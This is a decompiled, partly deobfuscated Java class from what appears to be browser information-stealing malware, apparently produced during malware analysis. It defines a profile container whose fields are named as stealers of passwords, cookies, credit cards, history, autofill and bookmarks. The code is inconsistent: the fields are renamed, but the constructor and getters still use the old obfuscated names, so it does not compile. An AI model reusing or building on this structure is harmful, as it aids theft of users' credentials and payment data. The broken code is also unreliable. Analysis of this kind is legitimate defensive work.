/*\n * ========================================\n * DEOBFUSCATED: ProfileData.java\n * Original: c/f.java\n * ----------------------------------------\n * Profil veri konteyner - Login/Cookie/Card/History/Autofill/Bookmark/Download\n * ========================================\n */\n\n/*
 * Decompiled with CFR 0.152.
 */
package c;

import c.e;
import c.k;
import c.l;
import c.m;
import c.n;
import c.u;
import c.v;
import c.w;
import java.io.File;

public final class f {
    private final e browserProfile;
    private final File profileDir;
    private final n passwordStealer;
    private final l cookieStealer;
    private final k creditCardStealer;
    private final m historyStealer;
    private final u autofillStealer;
    private final v bookmarkStealer;
    private final w i;

    public f(e e2, File file) {
        this.a = e2;
        this.b = file;
        this.c = new n(this);
        this.d = new l(this);
        this.e = new k(this);
        this.f = new m(this);
        this.g = new u(this);
        this.h = new v(this);
        this.i = new w(this);
    }

    public e getBrowser() {
        return this.a;
    }

    public File getDirectory() {
        return this.b;
    }

    public n getDataLogins() {
        return this.c;
    }

    public l getDataCookies() {
        return this.d;
    }

    public k getDataCCs() {
        return this.e;
    }

    public m getDataHistory() {
        return this.f;
    }

    public u getDataAutofills() {
        return this.g;
    }

    public v getDataBookmarks() {
        return this.h;
    }

    public w getDataDownloads() {
        return this.i;
    }
}

